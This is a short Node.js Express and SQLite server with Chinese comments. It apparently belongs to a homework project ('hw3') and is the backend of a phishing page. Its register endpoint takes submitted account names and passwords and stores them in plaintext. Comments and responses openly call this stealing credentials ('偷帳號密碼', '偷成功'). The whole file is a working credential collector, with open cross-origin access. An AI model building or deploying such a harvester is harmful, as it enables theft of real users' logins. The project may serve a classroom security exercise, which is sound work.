const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());

// 初始化 SQLite3 資料庫
const db = new sqlite3.Database('./users.db', (err) => {
  if (err) {
    console.error('資料庫連線失敗:', err.message);
  } else {
    console.log('已連線到 SQLite3 資料庫');
  }
});

// 建立 users 資料表（如果不存在）
db.run(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  account TEXT UNIQUE,
  password TEXT
)`);

// 範例：新增一個測試帳號（只執行一次）
db.run(`INSERT OR IGNORE INTO users (account, password) VALUES (?, ?)`, ['testuser', 'testpass']);

// 偷帳號密碼 API：將新帳號密碼存進 users 資料表
app.post('/api/register', (req, res) => {
  const { account, password } = req.body;
  if (!account || !password) {
    return res.status(400).json({ success: false, message: '請輸入帳號和密碼' });
  }
  db.run('INSERT INTO users (account, password) VALUES (?, ?)', [account, password], function(err) {
    if (err) {
      if (err.code === 'SQLITE_CONSTRAINT') {
        return res.status(409).json({ success: false, message: '帳號已被偷過' });
      }
      return res.status(500).json({ success: false, message: '伺服器錯誤' });
    }
    res.json({ success: true, message: '偷成功' });
  });
});

app.use(express.static(path.join(__dirname, 'hw3')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'hw3', 'index.html'));
});
app.listen(PORT, () => {
  console.log(`伺服器啟動於 http://localhost:${PORT}`);
});


